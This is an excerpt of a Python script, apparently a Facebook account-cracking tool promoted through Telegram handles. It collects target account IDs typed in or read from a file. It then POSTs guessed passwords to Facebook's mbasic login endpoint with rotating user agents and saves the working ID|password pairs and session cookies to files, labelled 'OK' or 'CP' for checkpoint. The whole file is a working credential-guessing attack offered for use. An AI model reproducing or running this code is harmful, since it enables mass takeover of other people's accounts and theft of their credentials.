#Helo Command is by killer (Kak_killer )
...
import os,base64
os.system("xdg-open https://t.me/KILLER_CRACKER")
...
\33[1;34m| 
    ...
    𝐶𝑅𝐸𝐴𝑇𝐸𝐷 𝐵𝑌   :   @JG_HAMA     JG_shaba

    𝐶𝐻𝐸𝑁𝐸𝐿     :     @JG_HAMA           

    𝑇𝐿𝐸𝐺𝑅𝐴𝑀     :   @JG_HAMA       JG_shaba

    𝑇𝑂𝑂𝐿 𝑆𝑇𝐴𝑇𝑈𝑆  :   @JG_HAMA             
      
    𝑇𝑂𝑂𝐿𝑆 𝑉𝐼𝑅𝑆𝐼𝑂𝑁 :   10 . 6                 

    𝑇𝑂𝑂𝐿 𝑊𝐴𝑂𝑅𝐾    : WIFI AND DATA      
...
def login_lagi334():
	try:
		os.system('clear')
		print(logo)
		print(f'{b}NEED EXTENSION :{hh} COOKIEDOUGH')
		ses = requests.Session()
		cok = input(f'{k}input Cookie : ')
		ses.headers.update(
			{
...
def menu():
	os.system('clear')
	print(logo)
	print(f'{hh}[1] PUBLIG CLONE')
	print('')
	print(f'{hh}[2] FILE CLONE') 
	print(f'{hh}[0] LOGOUT')
	opt = input(f' Choose : ')
	if opt =='1':
		dump_massal()
...
def dump_massal():
	try:
		...
		exit()
	try:
		print(f' Target Prefix id 10009 Better')
		jum = int(input(f' {P}Want How Much Idz Target {x} : '))
	except ValueError:
		print('   Wrong input ')
		exit()
	if jum<1 or jum>80:
	...
	for met in range(jum):
		yz+=1
		kl = input(f' {P}input Idz Target '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def File2():
			print('')
			print(f'   {hh}   FILE CLONING')
			try:
				print(' ')
				fileX = input (f' {hh}ENTER FILE PATH : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				print('')
				print(f'{m}TOTAL ID :{b} '+str(len(id)))
				setting()
			except IOError:
				exit("[!] FILE  %s NOT FOUND"%(fileX))
def setting():
	print(f' {hh}[1] {hh} OLD ID CLONE')
	print(f' [2] {hh} NEW ID CLONE')
	print(f' [3] {hh} RANDOM ID CLONE')
	hu = input(' \33[1;96mChoose : ')
	if hu in ['1','01']:
	...
	print(f'[1] {hh}METHOD API')
	print(f'[2] {hh}METHOD MBASIC')
	opt = input(f' Choose : ')
	if opt =='1':
...
def crack1(idf,pwv):
	...
	sys.stdout.write(f"\r{hh}♔︎ KILLER ♕︎  {P}<{b}{loop}{P}/{u}{len(id)}{P}>  &&{P}[{H}{ok}{P}]&&{P}[{k}{cp}{x}]✘[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crack2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{hh} ꧁shaba ™ ꧂  {P}<{b}{loop}{P}/{u}{len(id)}{P}>  &&{P}[{H}{ok}{P}]&&{P}[{k}{cp}{x}]✘[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
...
'content-type': 'application/x-www-form-urlencoded',
    ...
    'accept-encoding':'gzip, deflate br',
			...
			po = ses.post('https://mbasic.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjg1MTExMjY4LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&ref=dbl',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {m}[killer™_CP]-`´- {idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {hh}[killer™_OK]-`´- {idf}|{pw}')
